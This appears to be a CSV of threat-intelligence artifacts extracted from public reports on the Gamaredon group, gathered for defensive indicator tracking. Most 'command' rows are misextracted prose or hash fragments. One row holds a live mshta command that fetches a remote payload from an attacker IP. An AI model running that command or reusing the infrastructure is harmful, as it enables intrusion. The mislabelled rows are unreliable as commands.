schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--gamaredon,artifact--sha256:38cd6ce41360920ae87cec82491bbe1a3e75384bb4f561c0657a409c5947e500,observation--sha256:c0acb2697e53ff13a7acd4c28b88beea2a7d02747a5c4ff6b176ee98e7284b57,command,"%APPDATA%\Nitro\<randomFilename> , which executes a PowerShell command reading, concatenating,","%APPDATA%\Nitro\<randomFilename> , which executes a PowerShell command reading, concatenating",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"19 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Downloader of PteroPSDoor variant 2 We know about two versions of the downloader that deploys PteroPSDoor variant 2 . Their functionality is similar, but the older one is a VBScript with an embedded PowerShell command line, while the newer one is a PowerShell script encapsulated in a VBScript. The older version uses the URI /new and comprises two parts. The first part executes a brief PowerShell comm",
1.0.0,actor--gamaredon,artifact--sha256:3defe1ffedc5ba9b072c41d2fb6c038171f73da301bc0ad4b8b7e73ef6b06647,observation--sha256:b7d723ff5f7b6f10603d03189f68be1a3879259d33ac834a381c7ccb56afc343,command,"%COMPUTERNAME%a [sic] under the HKCU Run key. Both methods run a PowerShell loader, which is stor ed as","%COMPUTERNAME%a [sic] under the HKCU Run key. Both methods run a PowerShell loader, which is stor ed as",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"21 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances described in detail in our Gamaredon 2024 white paper. That version was being used without notable updates until March 23rd, 2025, when it was replaced with a new version. Two days later , 2025, we discovered this updated version, now featuring additional obfuscation and an empty URI path in HTTP requests. Lacking a unique URI, on which we based our naming of all the previous versions , we named it version 13, as it",
1.0.0,actor--gamaredon,artifact--sha256:c8f5ae424932d61c2edb50134493050f95c941cc6d0e2f1a5bc09dc4fef5e449,observation--sha256:1cb8ca7e0d0cabbef13348d0edc6bfb885ecc33a6994e4d10cb8bcdf5402cfbb,command,%windir%\system32\mshta.exe http://194.180.174[.]203/23.01/mo/baseball[.]DjVu,%windir%\system32\mshta.exe http://194.180.174.203/23.01/mo/baseball.DjVu,candidate,,unknown,unknown,not-stated,,source--gamaredon--a0d52e16421d8b11,Gamaredon/Beyond_Bullets_and_Bombs_An_Examination_of_Armageddon_Groups_Cyber.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Beyond Bullets and Bombs: An Examination of Armageddon Group's Cyber Warfare Against Ukraine 9 %windir%\system32\mshta.exe http://194.180.174[.]203/23.01/mo/baseball[.]DjVu MITRE ATT&CK TECHNIQUE NAME TECHNIQUE ID Spearphishing Attachment T1566.001 User Execution T1204.002 System Binary Proxy Execution: Mshta T1218.005 Defense Evasion Abusing Telegram to Bypass DNS Generally in the second stage, a malicious VBScript is used then they abuse Telegram to get the real C2 IP address. For example http",
1.0.0,actor--gamaredon,artifact--sha256:a1effa300a9a968d58305f6a125c0910da242bbd1f7585359616a468412cc63a,observation--sha256:8209d255b5f26048a068b7ccb3ec0f4fa6e916645cb677193ce9cebdc99ffb69,command,- checking the mshta.exe process in the list of running,- checking the mshta.exe process in the list of running,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 13. Resolving domain to IP It should be noted that the new file has the same name and location as the previous one, so it checks its existence before code will be written. If present, the previous file is deleted. The same names are misleading because the contents of all the files are different. The analysis of other scripts revealed the following additional functionality: - checking the mshta.exe process in the list of running processes and terminating it; - suspending its work for some ",
1.0.0,actor--gamaredon,artifact--sha256:85376e69f7f6f4ad0ee7b664cdf87abff1e6e30d4fc516c5c6412cad1e3204c3,observation--sha256:2a092e54f6180d79eea5307a9d0f30005215443a4a4fb462c183670ec5bae10e,command,"/power.php ) as an intermediate stage, which can receive either a PowerShell command or a VBScript","/power.php ) as an intermediate stage, which can receive either a PowerShell command or a VBScript",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroLNK is obfuscated in multiple layers, detailed in the Obfuscation section. The obfuscation applied to the scheduler component, where selected characters are replaced with random sequences, is also used on code blocks embedded as base64 -encoded blobs. Nearly all strin g variables and small code blocks are divided into smaller parts and then concatenated before use or execution. Additionally, fun",
1.0.0,actor--gamaredon,artifact--sha256:cb71f6cf5e9e6166cedacc8e20f549c3eb55701ade6c10c690d22c4f4af2c10b,observation--sha256:e0682df5803e028bad9c60b19926bddf1d55a73d80a115ad2b43241d47b25af8,command,.001 PowerShell Group executes ps1 scripts in system,001 PowerShell Group executes ps1 scripts in system,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Techniques used in cyberattack (according to MITRE ATT & CK Matrix) Tactics ID Name Description Initial Access T1566 .001 Spearphishing Attachment Group sends spear phishing emails with malicious attachments or links .002 Spearphishing Link Execution T1059 .001 PowerShell Group executes ps1 scripts in system .005 Visual Basic Group executes numerous vbs scripts in system T1053 .005 Scheduled Task Group sets up scheduled tasks to launch scripts and downloaded tasklist T1047 WMI Group uses WMI com,
1.0.0,actor--gamaredon,artifact--sha256:2bbe757aea494f0ceb77670454a39735bd6c7d55116098dad98339a983b767ef,observation--sha256:3b124a01d01d9e599e974a292281e36cd8e4995d5a90369988c33588520ac16a,command,0141C1E1888F433B5342 N/A PowerShell/Pterodo.WO PteroPSDoor version 1000.,0141C1E1888F433B5342 N/A PowerShell/Pterodo.WO PteroPSDoor version 1000,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After a break in January 2025, Gamaredon resumed running frequent spearphishing campaigns, with notably higher activity in the second half of the year , during which Gamaredon also slightly tweaked its TTPs, and started exploiting a vulnerability affecting WinRAR ( CVE-2025-8088) to deploy its typical malicious HTA downloaders . Lastly, Gamaredon continued with its efforts to protect and hide its network infrastruct",
1.0.0,actor--gamaredon,artifact--sha256:a88a0f4b9681108d545397c5c847e1dedae991bb108948aa7444960fd4548b92,observation--sha256:8a8d63777c73c2033030f387ee3557f774be91d628d5208d0bfe852f9afb6d2f,command,09F3E1DD6C78D58D8E89 N/A PowerShell/Pterodo.FR PteroBleed – steals the IndexedDB,09F3E1DD6C78D58D8E89 N/A PowerShell/Pterodo.FR PteroBleed – steals the IndexedDB,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"39 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 IOCS Files In this section, w e only provide one example for each tool or variant . All IoCs were already provided in the MISP events published with private ESET Threat Intelligence reports throughout 2022 and 2023. SHA-1 Filename Detection Description DF1C0A70E7A02B839AB3 AAC3FC410E61EEFB58EB N/A VBS/Pterodo.AEV PteroX – a VBScript general -purpose downloader. B50F10BBDB49BE6D868B 09F3E1DD6C78D58D8E",
1.0.0,actor--gamaredon,artifact--sha256:ae85e969560715a948f7063afbf3d8bf616a9604c29566a030613e5012a82376,observation--sha256:5aaae9cd0741e595fbd884d0265fac16362b6b479c04f9680656aba95ef8d8ef,command,152B6A9148CD9D2F6662 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell,152B6A9148CD9D2F6662 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,41 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 025E3D88C53FC12D5A4A AB726E696F2815BAC84D N/A VBS/Pterodo.TX PteroPSLoad – PowerShell downloader. D5576E578518E474A5DF F654C44AB3EC4A6E4ECF N/A PowerShell/Pterodo.FD PteroPSLoad – PowerShell downloader. 28F4F0367C2BB0574C8A 7D1B9C3E71E6AC678300 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell downloader. E0BD8855159CB708789C 4DE183E107C5C117FBA1 N/A PowerShell/P,
1.0.0,actor--gamaredon,artifact--sha256:dedbd240112ffe75c32487734353a511cc57c0623a062fc93d2b7d075321c2be,observation--sha256:ef34b1bdf9f5692f940befa0e5b0c1edb9e239f0028dcb5e1d8e0a3e5429f8e6,command,1CCED99B6DD4FEC6A3B N/A VBS/Pterodo.CEB PteroScout PowerShell version.,1CCED99B6DD4FEC6A3B N/A VBS/Pterodo.CEB PteroScout PowerShell version,candidate,2025-11-20T00:00:00Z,day,known,same-record,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"31 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances SHA -1 Filename Detection Description F718F25DCCF68BD7CB28A A7CB526FFA54B0E51A8 N/A PowerShell/TrojanDownloa der.Agent.LDD Downloader of PteroPSDoor. 09A22856890AB6AEF6311 CA2BD27BE54E86DA75C N/A PowerShell/Pterodo.QD PteroPSLoad – PowerShell downloader. 0F952E6162BCC881F7F84 4F3E2C7CDA9A5C74D72 N/A PowerShell/Pterodo.SU PteroPSLoad – PowerShell downloader. 61B03FF9D84EB653F9F66 867DBF76DFB1E130E93 N/A PowerShell/Pt",
1.0.0,actor--gamaredon,artifact--sha256:10c0c609ef37df686ad303cb6d5c58046dacbc4e3630c1f34bcd997caba08d48,observation--sha256:4faadb0a710e4b36ee9ca70aa56821725a5627acf272cfdbd4964105d1f58e4b,command,"2022, is a PowerShell tool that weaponizes selected Desktop LNK files. It drops a basic skeleton of a","2022, is a PowerShell tool that weaponizes selected Desktop LNK files. It drops a basic skeleton of a",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"25 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 For both vari ants, we have only seen PteroDash being used as a downloader component of PteroTemplate. PteroDig PteroDig (SHA -1: 1AEAE7A567C71200BA804801C4CEC227D2B64414 ), which we discovered in November 2022, is a PowerShell tool that weaponizes selected Desktop LNK files. It drops a basic skeleton of a downloader to %USERPROFILE% and stores relevant parts of the downloader script in the registry ",
1.0.0,actor--gamaredon,artifact--sha256:d1b48d7fc72e38eac3426569a697d51755e5f11e5e6e68895917981a6906f933,observation--sha256:25edde0fa93db0c3591d744036aa5a1c31569b398609c94ae33ad316c5fb6370,command,2023 and 2024. The programming languages of choice for developing the se new tools remain PowerShell,2023 and 2024. The programming languages of choice for developing the se new tools remain PowerShell,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"7 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances TOOLSET In 2025, Gamaredon developed six new custom tools, but also continued using and updating many of its tools that we described in our two previous white papers, which detailed the group’s activities in 2 022– 2023 and 2024. The programming languages of choice for developing the se new tools remain PowerShell and VBScript : all Gamaredon tools mentioned in this white paper are written in one of these programming",
1.0.0,actor--gamaredon,artifact--sha256:b6fd812d4c069b7f833359f7a4ddbdb8988d8d588386bb2e2916766b2583ab3c,observation--sha256:eabb1742298298c5c7dd502d4f664c04e8d48c4c10ea56065c03273d339fd529,command,2024 PowerShell Exfiltrates files to Dropbox.,2024 PowerShell Exfiltrates files to Dropbox,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Classification First seen Written in Description PteroLNK VBScript version Weaponizer November 2020 VBScript Weaponizes connected USB drives. PteroPSLoad Downloader October 2021 PowerShell Downloads other Gamaredon tools. PteroBox File stealer November 2024 PowerShell Exfiltrates files to Dropbox. PteroPSDoor File stealer May 2022 PowerShell Exfiltrates files to Gamaredon C&C servers and various cloud storage se",
1.0.0,actor--gamaredon,artifact--sha256:dc555906b6dee7dd78ca62709b7832771792d0f7354129ba64bf976a803fd1dd,observation--sha256:b4ddb26d37dcf344d5017318c4f6533df48d9505b7341362e1eac4398c4efe34,command,20EB4F59F2A8F128255D N/A PowerShell/Pterodo.GA Downloader of PteroBleed.,20EB4F59F2A8F128255D N/A PowerShell/Pterodo.GA Downloader of PteroBleed,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"39 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 IOCS Files In this section, w e only provide one example for each tool or variant . All IoCs were already provided in the MISP events published with private ESET Threat Intelligence reports throughout 2022 and 2023. SHA-1 Filename Detection Description DF1C0A70E7A02B839AB3 AAC3FC410E61EEFB58EB N/A VBS/Pterodo.AEV PteroX – a VBScript general -purpose downloader. B50F10BBDB49BE6D868B 09F3E1DD6C78D58D8E",
1.0.0,actor--gamaredon,artifact--sha256:66f8ba0a13dd29c9977b7ffd45f8d9fe6a5053503e9760abc83b84901d6e9bbe,observation--sha256:af86ec91492274d38b44415352a0fb1f5ca8082f78f74a9acef902c2b27e1599,command,23C1C93FA7DE78F46A3F N/A PowerShell/Agent.BGU PteroPSLoad – PowerShell,23C1C93FA7DE78F46A3F N/A PowerShell/Agent.BGU PteroPSLoad – PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,40 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 945A50678E6E9AA29370 7E4F41E9BC81B9098BC5 N/A PowerShell/TrojanDownlo ader.Agent.GBK Downloader of PteroGram. AB7C5C7CD6F75B1D0A7A D29176A254055BE5356E N/A VBS/Pterodo.SC Downloader of PowerSh ell version of PteroLNK. 866E874CFF4EAD298899 24AA02630E68AE252B55 N/A VBS/Pterodo.SL Downloader of the VBScript version of PteroLNK. 49CF239AB2EBD04CAFDC EC07FBB0C1C1A43E8C,
1.0.0,actor--gamaredon,artifact--sha256:71a82353d668b45b5d280afba42e80101fbe0655ccac917569db68ce2b745703,observation--sha256:09ad27e2749427bff4632efb68b1c4e66238a4dd91bad94c071a1743ba5700f4,command,2416DFC031CF 0D05054D5BEB9739CBA6470FE585 ) is a PowerShell infostealer ; its main goal is,2416DFC031CF 0D05054D5BEB9739CBA6470FE585 ) is a PowerShell infostealer ; its main goal is,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroGram Discovered by ESET Research in June 2023, PteroGram (SHA -1: AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram Desktop application. Telegram Desktop stores its data in %APPDATA%\Telegram Desktop \tdata, which contains encrypted session data. The encryption key is derived from a passcode and salt, but if no passcode is set, an empty string is used ",
1.0.0,actor--gamaredon,artifact--sha256:74dbf8d5894e7afcb03f30bf1d615ce73ac11accc28f2982e79d6d03cdeb3a9a,observation--sha256:8b13fe197783d2fb7c1149e7cf31334721110dc2aed23e1b32e0259fcde1e0e8,command,259CBD2626562E17670C N/A PowerShell/Pterodo.GA Downloader of PteroSocks.,259CBD2626562E17670C N/A PowerShell/Pterodo.GA Downloader of PteroSocks,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,42 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 2B9B0AD0B65BB6101704 684CD339E946FAE2DCFA N/A VBS/Pterodo.ABV PteroSand – a VBScript general - purpose downloader. 2416DFC031CF0D05054D 5BEB9739CBA6470FE585 N/A PowerShell/Pterodo.GO PteroScout – gathers and exfiltrates various information about the compromis ed system. 8C79BB8EB97E774FFCEC 66C64F5CC8A11ED6C693 N/A PowerShell/Pterodo.GL Downloader of PteroScout. B,
1.0.0,actor--gamaredon,artifact--sha256:19f9021fc748884b8255531fccfa20b064c83518247c1034cc067a63cc0d03b8,observation--sha256:b3b4a4f855d13ce00441f5f61b3c4732bf94abf752a501181491b7294135f867,command,27C35E492B2846C06DD6 N/A PowerShell/Pterodo.VP PteroDum – downloads VBScript,27C35E492B2846C06DD6 N/A PowerShell/Pterodo.VP PteroDum – downloads VBScript,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After a break in January 2025, Gamaredon resumed running frequent spearphishing campaigns, with notably higher activity in the second half of the year , during which Gamaredon also slightly tweaked its TTPs, and started exploiting a vulnerability affecting WinRAR ( CVE-2025-8088) to deploy its typical malicious HTA downloaders . Lastly, Gamaredon continued with its efforts to protect and hide its network infrastruct",
1.0.0,actor--gamaredon,artifact--sha256:4954b4dfeeed351caf8c3681d3baae50e6c66976934bb34cb79da983394e9fdc,observation--sha256:2c95307b04344c3cdc0105bb4c6fa55fe4c419885054cb44387ce8f175678dd6,command,2CDB1DA4DF1A33E379C2F24DD6A05709F4848CB6 ) is a PowerShell infostealer designed to extract,2CDB1DA4DF1A33E379C2F24DD6A05709F4848CB6 ) is a PowerShell infostealer designed to extract,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"29 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 If it finds any profile with a saved password, it exfiltrates the data from the following registry values of this key: · Account Name · Email · IMAP Server · IMAP Port · IMAP User · SMTP Port · SMTP Server It also exfiltrates the IMAP Password from the registry, but this data is first decrypted before exfiltration by using [System.Security.Cryptography.ProtectedData]::Unprotect . PteroCookie Discover",
1.0.0,actor--gamaredon,artifact--sha256:b2c2f93a9ea7719cc60be1d00ece9af14e2eec9b5bf452e506a114e3491cc183,observation--sha256:a0a58d0b14c1e7b6a412ea3e54505a035a7818bdb2792830cf95a30e295c3329,command,38332C05F3D4171C9DCC N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell,38332C05F3D4171C9DCC N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,41 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 025E3D88C53FC12D5A4A AB726E696F2815BAC84D N/A VBS/Pterodo.TX PteroPSLoad – PowerShell downloader. D5576E578518E474A5DF F654C44AB3EC4A6E4ECF N/A PowerShell/Pterodo.FD PteroPSLoad – PowerShell downloader. 28F4F0367C2BB0574C8A 7D1B9C3E71E6AC678300 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell downloader. E0BD8855159CB708789C 4DE183E107C5C117FBA1 N/A PowerShell/P,
1.0.0,actor--gamaredon,artifact--sha256:fe9734cd92ca095578da617615e992340c56068f9bfecb1d93270539b2e69de5,observation--sha256:bdd4d66fdf25650c9bd5da9de28e9906ed707be6de9fd81181b0f04f6a707917,command,3CAC26775D6709DFBBDD N/A PowerShell/Pterodo.GN PowerShell version of PteroLNK – USB,3CAC26775D6709DFBBDD N/A PowerShell/Pterodo.GN PowerShell version of PteroLNK – USB,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,40 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 945A50678E6E9AA29370 7E4F41E9BC81B9098BC5 N/A PowerShell/TrojanDownlo ader.Agent.GBK Downloader of PteroGram. AB7C5C7CD6F75B1D0A7A D29176A254055BE5356E N/A VBS/Pterodo.SC Downloader of PowerSh ell version of PteroLNK. 866E874CFF4EAD298899 24AA02630E68AE252B55 N/A VBS/Pterodo.SL Downloader of the VBScript version of PteroLNK. 49CF239AB2EBD04CAFDC EC07FBB0C1C1A43E8C,
1.0.0,actor--gamaredon,artifact--sha256:4b319c3b57ca6b36756781396eeb8f580996d2fbb6eef0f897e6ab38e5cc699f,observation--sha256:40ed4ab6ea20ed79624b7e34fd9c70e0c795362e356c5ce3758ca819378a8cb3,command,464209F7B5E347810299 N/A PowerShell/Pterodo.PK PowerShell version of PteroLNK –,464209F7B5E347810299 N/A PowerShell/Pterodo.PK PowerShell version of PteroLNK –,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After a break in January 2025, Gamaredon resumed running frequent spearphishing campaigns, with notably higher activity in the second half of the year , during which Gamaredon also slightly tweaked its TTPs, and started exploiting a vulnerability affecting WinRAR ( CVE-2025-8088) to deploy its typical malicious HTA downloaders . Lastly, Gamaredon continued with its efforts to protect and hide its network infrastruct",
1.0.0,actor--gamaredon,artifact--sha256:441146e8ef2d673ca149094072d5d3a993af21019054068f76cd7a1b0611036b,observation--sha256:5905747b127ffb6597a2dbd463d8ea6dc7b977b4865bd267a264a6921fe442f1,command,4801C4CEC227D2B64414 N/A PowerShell/Pterodo.FF PteroDig – LNK weaponizer.,4801C4CEC227D2B64414 N/A PowerShell/Pterodo.FF PteroDig – LNK weaponizer,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"39 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 IOCS Files In this section, w e only provide one example for each tool or variant . All IoCs were already provided in the MISP events published with private ESET Threat Intelligence reports throughout 2022 and 2023. SHA-1 Filename Detection Description DF1C0A70E7A02B839AB3 AAC3FC410E61EEFB58EB N/A VBS/Pterodo.AEV PteroX – a VBScript general -purpose downloader. B50F10BBDB49BE6D868B 09F3E1DD6C78D58D8E",
1.0.0,actor--gamaredon,artifact--sha256:fe1f8d5871c594fc963d7ac7aaf3e1061cff2cb5e2b2e9e5e62d495d97572cef,observation--sha256:c609e959fd3c31a0b4a7c72dee807813acbff90c5be306e1105ce833a4e213b4,command,4DE183E107C5C117FBA1 N/A PowerShell/Pterodo.GE PteroPSLoad – PowerShell,4DE183E107C5C117FBA1 N/A PowerShell/Pterodo.GE PteroPSLoad – PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,41 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 025E3D88C53FC12D5A4A AB726E696F2815BAC84D N/A VBS/Pterodo.TX PteroPSLoad – PowerShell downloader. D5576E578518E474A5DF F654C44AB3EC4A6E4ECF N/A PowerShell/Pterodo.FD PteroPSLoad – PowerShell downloader. 28F4F0367C2BB0574C8A 7D1B9C3E71E6AC678300 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell downloader. E0BD8855159CB708789C 4DE183E107C5C117FBA1 N/A PowerShell/P,
1.0.0,actor--gamaredon,artifact--sha256:ccaf2ac6e174f4f1ae0b7ddeec06a5d667201b4804d507fd5595676f9f315a83,observation--sha256:a9fb4a0772902a4a39de1d827d132f56d6140347bfbe9f90f81f2d551d7cfdcb,command,4F3E2C7CDA9A5C74D72 N/A PowerShell/Pterodo.SU PteroPSLoad – PowerShell,4F3E2C7CDA9A5C74D72 N/A PowerShell/Pterodo.SU PteroPSLoad – PowerShell,candidate,2025-11-20T00:00:00Z,day,known,same-record,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"31 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances SHA -1 Filename Detection Description F718F25DCCF68BD7CB28A A7CB526FFA54B0E51A8 N/A PowerShell/TrojanDownloa der.Agent.LDD Downloader of PteroPSDoor. 09A22856890AB6AEF6311 CA2BD27BE54E86DA75C N/A PowerShell/Pterodo.QD PteroPSLoad – PowerShell downloader. 0F952E6162BCC881F7F84 4F3E2C7CDA9A5C74D72 N/A PowerShell/Pterodo.SU PteroPSLoad – PowerShell downloader. 61B03FF9D84EB653F9F66 867DBF76DFB1E130E93 N/A PowerShell/Pt",
1.0.0,actor--gamaredon,artifact--sha256:962795f9c8c01507e3be8bf40883599cc9e2551c3be138f4031b083f856c3159,observation--sha256:6ae1597f44ada4916bcb093700eaa6d8a67d2092e1eedd185c0d7efa377ca374,command,5. Prohibit the use of cmd and powershell programs in the,5. Prohibit the use of cmd and powershell programs in the,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,".bat, .js, etc.) , as well as prohibit the unpacking of such files by archivers. Additionally, disable all executable files from the %AppData% directory. 5. Prohibit the use of cmd and powershell programs in the information system with user rights. Disable the ability to r un any scripts (*script.exe) with the users’ rights . 6. Prohibit the automatic launch of programs with the operating system, as well as access to programs in the system registry. 7. Pay attention to all incoming e -mail, espe",
1.0.0,actor--gamaredon,artifact--sha256:328dbd8621a1f3e6894fbb9da73166fdf5cae108bbe2a29a84730c81f5618afd,observation--sha256:8ff3287477ec6e5fd90452b4da59b48bea67e0a63f481972d39b38d815038bad,command,54573C9C62D93E0570E0 N/A PowerShell/Pterodo.GA Downloader of PteroClone.,54573C9C62D93E0570E0 N/A PowerShell/Pterodo.GA Downloader of PteroClone,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"39 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 IOCS Files In this section, w e only provide one example for each tool or variant . All IoCs were already provided in the MISP events published with private ESET Threat Intelligence reports throughout 2022 and 2023. SHA-1 Filename Detection Description DF1C0A70E7A02B839AB3 AAC3FC410E61EEFB58EB N/A VBS/Pterodo.AEV PteroX – a VBScript general -purpose downloader. B50F10BBDB49BE6D868B 09F3E1DD6C78D58D8E",
